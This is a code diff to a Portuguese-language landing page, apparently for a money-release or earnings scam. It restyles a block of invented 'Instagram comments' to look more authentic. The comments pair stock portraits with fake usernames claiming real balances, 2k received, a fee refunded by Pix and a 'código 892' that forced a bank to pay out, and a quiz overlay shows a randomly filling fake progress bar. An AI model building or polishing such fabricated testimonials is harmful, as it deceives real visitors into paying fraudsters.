@@ -42,11 +42,13 @@
         .text { font-size: 15px; color: #ddd; }
         .meta { font-size: 12px; color: #777; margin-top: 8px; }
 
-        /* INSTAGRAM */
+        /* INSTAGRAM AJUSTADO (TEXTO EMBAIXO) */
         .insta-section { margin-top: 40px; border-top: 1px solid #333; padding-top: 20px; }
-        .insta-comment { display: flex; align-items: flex-start; margin-bottom: 18px; }
-        .insta-name { font-weight: bold; font-size: 14px; color: #fff; margin-right: 8px; }
-        .insta-text { font-size: 14px; color: #efefef; }
+        .insta-comment { display: flex; align-items: flex-start; margin-bottom: 22px; }
+        .insta-body { margin-left: 12px; display: flex; flex-direction: column; }
+        .insta-name { font-weight: bold; font-size: 13px; color: #fff; }
+        .insta-text { font-size: 14px; color: #efefef; margin-top: 2px; }
+        .insta-meta { font-size: 11px; color: #8e8e8e; margin-top: 6px; display: flex; gap: 12px; font-weight: 500; }
         .avatar { width: 42px; height: 42px; border-radius: 50%; object-fit: cover; }
 
         /* QUIZZ OVERLAY FULLSCREEN */
@@ -56,7 +58,6 @@
         .q-step.active { display: block; }
         .q-btn { display: block; width: 100%; background: #222; color: #fff; border: 1px solid #444; padding: 18px; margin: 12px 0; border-radius: 8px; font-weight: bold; cursor: pointer; text-align: center; font-size: 16px; }
         
-        /* Loading */
         .loader-container { display: none; margin: 20px 0; }
         .loader-bar { width: 100%; background: #222; height: 12px; border-radius: 10px; overflow: hidden; }
         .loader-fill { width: 0%; height: 100%; background: #28a745; transition: width 0.3s; }
@@ -109,12 +110,52 @@
         </div>
 
         <div class="insta-section">
-            <p style="font-weight: bold; margin-bottom: 15px; font-size: 14px; color: #888;">Comentários do Instagram</p>
-            <div class="insta-comment"><img src="https://randomuser.me/api/portraits/women/50.jpg" class="avatar"><div class="insta-body"><span class="insta-name">carol_mendes</span><span class="insta-text">Gente, façam logo! O saldo é real e o suporte é nota 10 🔥</span></div></div>
-            <div class="insta-comment"><img src="https://randomuser.me/api/portraits/men/20.jpg" class="avatar"><div class="insta-body"><span class="insta-name">bruno.oficial</span><span class="insta-text">Melhor que mega sena, recebi 2k hoje 🚀🚀</span></div></div>
-            <div class="insta-comment"><img src="https://randomuser.me/api/portraits/women/15.jpg" class="avatar"><div class="insta-body"><span class="insta-name">paty_rocha2026</span><span class="insta-text">O estorno da taxa caiu direto no pix, podem confiar!</span></div></div>
-            <div class="insta-comment"><img src="https://randomuser.me/api/portraits/men/5.jpg" class="avatar"><div class="insta-body"><span class="insta-name">felipe_santana</span><span class="insta-text">Chave ativada e dinheiro no bolso. Valeu Roberto!</span></div></div>
-            <div class="insta-comment"><img src="https://randomuser.me/api/portraits/women/90.jpg" class="avatar"><div class="insta-body"><span class="insta-name">renata.almeida.ferreira</span><span class="insta-text">O banco não queria soltar meu dinheiro, mas o código 892 forçou a liberação.</span></div></div>
+            <p style="font-weight: bold; margin-bottom: 20px; font-size: 14px; color: #888;">Comentários do Instagram</p>
+            
+            <div class="insta-comment">
+                <img src="https://randomuser.me/api/portraits/women/50.jpg" class="avatar">
+                <div class="insta-body">
+                    <span class="insta-name">carol_mendes</span>
+                    <span class="insta-text">Gente, façam logo! O saldo é real e o suporte é nota 10 🔥</span>
+                    <div class="insta-meta"><span>2 min</span> <span>Curtir</span> <span>Responder</span></div>
+                </div>
+            </div>
+
+            <div class="insta-comment">
+                <img src="https://randomuser.me/api/portraits/men/20.jpg" class="avatar">
+                <div class="insta-body">
+                    <span class="insta-name">bruno.oficial</span>
+                    <span class="insta-text">Melhor que mega sena, recebi 2k hoje 🚀🚀</span>
+                    <div class="insta-meta"><span>5 min</span> <span>Curtir</span> <span>Responder</span></div>
+                </div>
+            </div>
+
+            <div class="insta-comment">
+                <img src="https://randomuser.me/api/portraits/women/15.jpg" class="avatar">
+                <div class="insta-body">
+                    <span class="insta-name">paty_rocha2026</span>
+                    <span class="insta-text">O estorno da taxa caiu direto no pix, podem confiar!</span>
+                    <div class="insta-meta"><span>12 min</span> <span>Curtir</span> <span>Responder</span></div>
+                </div>
+            </div>
+
+            <div class="insta-comment">
+                <img src="https://randomuser.me/api/portraits/men/5.jpg" class="avatar">
+                <div class="insta-body">
+                    <span class="insta-name">felipe_santana</span>
+                    <span class="insta-text">Chave ativada e dinheiro no bolso. Valeu Roberto!</span>
+                    <div class="insta-meta"><span>30 min</span> <span>Curtir</span> <span>Responder</span></div>
+                </div>
+            </div>
+
+            <div class="insta-comment">
+                <img src="https://randomuser.me/api/portraits/women/90.jpg" class="avatar">
+                <div class="insta-body">
+                    <span class="insta-name">renata.almeida.ferreira</span>
+                    <span class="insta-text">O banco não queria soltar meu dinheiro, mas o código 892 forçou a liberação.</span>
+                    <div class="insta-meta"><span>1h</span> <span>Curtir</span> <span>Responder</span></div>
+                </div>
+            </div>
         </div>
 
         <div style="text-align: center; margin: 50px 0;">
@@ -125,7 +166,6 @@
 
     <div id="quizz-overlay">
         <div class="quizz-content">
-            
             <div id="q-loader" class="loader-container">
                 <h3 id="loader-text" style="font-size:16px; margin-bottom:10px;">Processando...</h3>
                 <div class="loader-bar"><div id="loader-fill" class="loader-fill"></div></div>
@@ -163,7 +203,6 @@
             const fill = document.getElementById('loader-fill');
             document.getElementById('loader-text').innerText = text;
             loader.style.display = 'block';
-            
             let w = 0;
             const int = setInterval(() => {
                 w += Math.random() * 20;
